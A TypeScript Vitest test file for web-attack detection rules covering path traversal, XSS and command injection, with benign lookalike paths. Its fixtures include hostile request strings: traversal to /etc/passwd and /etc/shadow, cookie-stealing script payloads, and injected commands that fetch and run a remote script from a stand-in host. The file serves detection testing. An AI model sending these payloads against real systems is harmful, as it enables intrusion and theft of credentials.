import { describe, it, expect } from 'vitest';
import type { NormalizedEvent } from '@argus/contracts';
import { decodeRepeatedly } from '../../src/detection/rules/decode.js';
import { pathTraversalRule } from '../../src/detection/rules/path-traversal.js';
import { xssRule } from '../../src/detection/rules/xss.js';
import { commandInjectionRule } from '../../src/detection/rules/command-injection.js';

function req(path: string): NormalizedEvent {
  return {
    eventId: '00000000-0000-4000-8000-000000000001',
    timestamp: '2026-10-17T12:00:00.000Z',
    source: 'nginx',
    sourceIp: '198.51.100.9',
    outcome: 'failure',
    path,
    raw: '',
  };
}

// benign requests that superficially resemble attacks — none may fire
const BENIGN = [
  '/',
  '/api/orders?id=42',
  '/docs/getting-started/../index.html'.replace('../', ''), // already-normalized path
  '/search?q=onload+event+listener',
  '/search?q=how+to+use+the+id+command',
  '/files/report..final.pdf',
  '/api/items?sort=name;asc',
  '/blog/2026/10/javascript-tips',
  '/assets/app.js',
];

describe('decodeRepeatedly', () => {
  it('peels nested encodings', () => {
    expect(decodeRepeatedly('%252e%252e%252f')).toBe('../');
  });
  it('decodes the valid escapes around a malformed one', () => {
    expect(decodeRepeatedly('/a%2fb%zz')).toBe('/a/b%zz');
    expect(decodeRepeatedly('%252f%zz')).toBe('/%zz');
  });
  it('treats + as a space (query-string encoding)', () => {
    expect(decodeRepeatedly("'+OR+1=1")).toBe("' OR 1=1");
  });
});

describe('pathTraversalRule', () => {
  it.each([
    '/download?file=../../../../etc/passwd',
    '/static/..%2f..%2f..%2fetc/shadow',
    '/api/files?path=%252e%252e%252f%252e%252e%252fwindows%252fwin.ini',
    '/images/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts',
    '/x?f=..\\..\\boot.ini',
    // evasion: a junk escape used to make naive whole-string decoding give up
    '/x?f=%252e%252e%252f%252e%252e%252fetc%252fpasswd%zz',
  ])('flags %s', (path) => {
    expect(pathTraversalRule.evaluate(req(path))).toMatchObject({
      ruleId: 'path-traversal',
      severity: 'high',
      entity: '198.51.100.9',
    });
  });
  it.each(BENIGN)('ignores %s', (path) =>
    expect(pathTraversalRule.evaluate(req(path))).toBeUndefined(),
  );
});

describe('xssRule', () => {
  it.each([
    '/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E',
    '/profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E',
    '/redirect?url=javascript:alert(1)',
    '/comment?body=%3Csvg%2Fonload%3Dalert(1)%3E',
    '/q?x=%253Cscript%253E', // double-encoded
  ])('flags %s', (path) => {
    expect(xssRule.evaluate(req(path))).toMatchObject({
      ruleId: 'xss-attempt',
      severity: 'medium',
    });
  });
  it.each(BENIGN)('ignores %s', (path) => expect(xssRule.evaluate(req(path))).toBeUndefined());
});

describe('commandInjectionRule', () => {
  it.each([
    '/api/ping?host=127.0.0.1;cat%20/etc/passwd',
    '/api/ping?host=8.8.8.8|id',
    '/cgi-bin/status?cmd=%60whoami%60',
    '/api/export?name=report$(curl%20http://203.0.113.66/x.sh|sh)',
    '/api/ping?host=1.1.1.1&&wget%20http://203.0.113.66/a',
    '/api/run?c=cat${IFS}/etc/passwd',
  ])('flags %s', (path) => {
    expect(commandInjectionRule.evaluate(req(path))).toMatchObject({
      ruleId: 'command-injection',
      severity: 'high',
    });
  });
  it.each(BENIGN)('ignores %s', (path) =>
    expect(commandInjectionRule.evaluate(req(path))).toBeUndefined(),
  );
});
